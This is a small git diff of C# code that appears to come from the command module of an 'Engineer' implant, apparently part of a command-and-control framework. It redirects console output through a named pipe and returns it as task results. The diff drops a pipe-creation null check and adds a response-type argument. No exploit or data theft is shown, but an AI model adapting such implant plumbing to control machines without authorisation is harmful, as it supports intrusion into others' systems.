@@ -56,13 +56,7 @@ namespace Engineer.Commands
            var pipeHandle = WinAPIs.Kernel32.CreateNamedPipe(
                 "\\\\.\\pipe\\EngineerPipe",
                 WinAPIs.Kernel32.PipeOpenModeFlags.PIPE_ACCESS_DUPLEX, WinAPIs.Kernel32.PipeModeFlags.PIPE_TYPE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_READMODE_BYTE | WinAPIs.Kernel32.PipeModeFlags.PIPE_WAIT,1, 65535, 65535, 0, ref saAttr);
-
-            if (pipeHandle == null)
-            {
-                Console.WriteLine("Failed to create pipe");
-                Tasking.FillTaskResults("Failed to create pipe", task, EngTaskStatus.FailedWithWarnings);
-                return;
-            }
+           
 
             //use create file api call in the new named pipe address
             var pipeHandle2 = WinAPIs.Kernel32.CreateFile(
@@ -84,7 +78,7 @@ namespace Engineer.Commands
             if (!setHadnleSuccess)
             {
                 Console.WriteLine("Failed to redirect output");
-                Tasking.FillTaskResults("Failed to redirect output", task, EngTaskStatus.FailedWithWarnings);
+                Tasking.FillTaskResults("Failed to redirect output", task, EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                 return;
             }
 
@@ -123,7 +117,7 @@ namespace Engineer.Commands
                 Console.SetError(stdErr);
             }
 
-            Tasking.FillTaskResults(output, task, EngTaskStatus.Complete);
+            Tasking.FillTaskResults(output, task, EngTaskStatus.Complete,TaskResponseType.String);
         }
     }
 }
